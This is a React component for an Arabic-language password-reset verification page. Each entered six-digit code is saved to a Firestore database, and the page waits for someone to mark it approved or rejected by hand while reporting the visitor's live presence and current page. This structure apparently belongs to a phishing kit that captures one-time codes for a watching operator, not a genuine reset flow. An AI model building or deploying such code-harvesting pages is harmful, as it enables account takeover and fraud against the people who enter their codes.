import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Headphones, Loader2 } from 'lucide-react';
import { collection, addDoc, Timestamp, onSnapshot, doc, updateDoc } from 'firebase/firestore';
import { db } from '@/lib/firebase-config';
import { getClientId } from '@/lib/clientId';
import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';

const Logo = () => (
  <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-[70px] h-[70px]">
    <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
    <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
  </svg>
);

export default function ForgotPasswordVerifyPage() {
  const navigate = useNavigate();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [error, setError] = useState('');
  const [timeLeft, setTimeLeft] = useState(300);
  const [canResend, setCanResend] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const clientId = getClientId();
    setUserOnline(clientId, '/forgot-password-verify');
    
    // Check if we have the reset request ID
    const resetRequestId = sessionStorage.getItem('password_reset_request_id');
    if (!resetRequestId) {
      navigate('/forgot-password');
    }

    return () => setUserOffline(clientId);
  }, [navigate]);

  useEffect(() => {
    if (timeLeft <= 0) {
      setCanResend(true);
      return;
    }
    const timer = setInterval(() => setTimeLeft(prev => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `(${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')})`;
  };

  const handleInput = (index: number, value: string) => {
    const newCode = [...code];
    newCode[index] = value.replace(/[^0-9]/g, '').slice(-1);
    setCode(newCode);
    setError('');

    if (newCode[index] && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
    const newCode = [...code];
    pasteData.split('').forEach((char, i) => {
      if (i < 6) newCode[i] = char;
    });
    setCode(newCode);
    inputRefs.current[Math.min(pasteData.length, 5)]?.focus();
  };

  const handleSubmit = async () => {
    const fullCode = code.join('');
    if (fullCode.length !== 6) return;

    setLoading(true);
    setError('');

    try {
      const clientId = getClientId();
      const resetRequestId = sessionStorage.getItem('password_reset_request_id');
      
      // Add verification code to a sub-collection or specific table
      const docRef = await addDoc(collection(db!, 'passwordResetCodes'), {
        requestId: resetRequestId,
        clientId: clientId,
        code: fullCode,
        status: 'pending',
        createdAt: Timestamp.now()
      });

      setWaitingApproval(true);
      updateUserPage(clientId, '/forgot-password-verify-waiting');

      // Listen for approval
      const unsubscribe = onSnapshot(doc(db!, 'passwordResetCodes', docRef.id), (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data();
          if (data.status === 'approved') {
            unsubscribe();
            navigate('/reset-password');
          } else if (data.status === 'rejected') {
            unsubscribe();
            setWaitingApproval(false);
            setLoading(false);
            setError('رمز التحقق غير صحيح');
            setCode(['', '', '', '', '', '']);
            inputRefs.current[0]?.focus();
          }
        }
      });

    } catch (err) {
      console.error('Verify code error:', err);
      setError('حدث خطأ أثناء إرسال الرمز');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#101935] flex flex-col justify-between p-5" dir="rtl">
      <div className="top-bar w-full flex justify-between items-center text-[#8d99ae] text-sm px-2">
        <span>الإنكليزية</span>
        <Headphones className="w-5 h-5 cursor-pointer" />
      </div>

      <div className="content-wrapper w-full max-w-[380px] mx-auto flex flex-col items-center my-auto">
        <div className="logo mb-6">
          <Logo />
        </div>

        <h1 className="text-2xl font-bold mb-3 text-center text-white">رمز التحقق</h1>
        <p className="text-sm text-[#8d99ae] text-center mb-8 leading-relaxed">
          تم ارسال رمز التحقق يرجى ادخال الرمز
        </p>

        {waitingApproval ? (
          <div className="flex flex-col items-center w-full py-8">
            <div className="w-16 h-16 border-4 border-[#1e2942] border-t-[#4c72b8] rounded-full animate-spin mb-6"></div>
            <p className="text-white font-bold mb-2">جاري التحقق من الرمز...</p>
            <p className="text-[#8d99ae] text-sm">يرجى الانتظار</p>
          </div>
        ) : (
          <>
            <div className="otp-container flex gap-2.5 justify-center w-full mb-8" dir="ltr">
              {code.map((digit, i) => (
                <input
                  key={i}
                  ref={el => inputRefs.current[i] = el}
                  type="text"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleInput(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  onPaste={handlePaste}
                  className="w-12 h-14 bg-[#1e2942] border border-[#2a3859] rounded-xl text-white text-2xl font-bold text-center outline-none focus:border-[#4c72b8] focus:shadow-[0_0_10px_rgba(76,114,184,0.5)] transition-all"
                  inputMode="numeric"
                />
              ))}
            </div>

            <button
              onClick={handleSubmit}
              disabled={loading || code.join('').length !== 6}
              className="w-full py-3.5 bg-[#4c72b8] hover:bg-[#3b5a93] disabled:bg-[#3b4d75] text-white font-bold rounded-xl transition-all mb-6"
            >
              {loading ? <Loader2 className="w-6 h-6 animate-spin mx-auto" /> : 'تأكيد الرمز'}
            </button>

            {error && (
              <div className="text-red-400 text-sm text-center mb-6 animate-in fade-in duration-300">
                {error}
              </div>
            )}

            <div className="resend-text text-sm text-[#8d99ae] text-center">
              لم يصلك الرمز؟{' '}
              <span 
                onClick={() => canResend && window.location.reload()}
                className={`font-bold ${canResend ? 'text-[#4a7c59] cursor-pointer hover:underline' : 'text-slate-600 cursor-not-allowed'}`}
              >
                إعادة إرسال
              </span>
              {!canResend && <span className="mr-1">{formatTime(timeLeft)}</span>}
            </div>
          </>
        )}
      </div>
    </div>
  );
}
